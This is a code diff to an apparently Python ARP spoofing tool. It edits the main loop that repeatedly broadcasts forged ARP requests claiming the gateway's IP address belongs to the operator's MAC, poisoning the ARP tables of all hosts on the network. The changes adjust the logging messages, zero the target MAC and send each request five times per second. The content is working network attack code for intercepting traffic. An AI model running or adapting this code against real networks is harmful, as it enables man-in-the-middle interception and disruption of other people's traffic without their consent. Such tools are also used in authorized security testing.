@@ -118,14 +118,16 @@ if __name__ == '__main__':
         if args.ipv4_multicast_requests or args.ipv6_multicast_requests or args.broadcast_requests:
             if args.ipv4_multicast_requests:
                 ethernet_destination_mac_address: str = '01:00:5e:00:00:01'
+                base.print_info('Send ARP requests to IPv4 multicast MAC address: ', ethernet_destination_mac_address)
             elif args.ipv6_multicast_requests:
                 ethernet_destination_mac_address: str = '33:33:00:00:00:01'
+                base.print_info('Send ARP requests to IPv6 multicast MAC address: ', ethernet_destination_mac_address)
             else:
                 ethernet_destination_mac_address: str = 'ff:ff:ff:ff:ff:ff'
+                base.print_info('Send ARP requests to broadcast MAC address: ', ethernet_destination_mac_address)
 
-            base.print_info('Spoof ARP table: ', gateway_ip_address, ' -> ', your_mac_address)
-            base.print_info('Send ARP Multicast requests to: ', ethernet_destination_mac_address)
-            base.print_info('Start ARP spoofing ...')
+            base.print_info('Spoof ARP table in all hosts: ', gateway_ip_address, ' -> ', your_mac_address)
+            base.print_info('ARP spoofing is running ...')
 
             while True:
                 arp_request: bytes = arp.make_request(
@@ -133,10 +135,11 @@ if __name__ == '__main__':
                     ethernet_dst_mac=ethernet_destination_mac_address,
                     sender_mac=your_mac_address,
                     sender_ip=gateway_ip_address,
-                    target_mac=your_mac_address,
+                    target_mac='00:00:00:00:00:00',
                     target_ip=your_ip_address)
-                raw_socket.send(arp_request)
-                sleep(0.333)
+                for _ in range(5):
+                    raw_socket.send(arp_request)
+                sleep(1)
         # endregion
 
         # region Set target
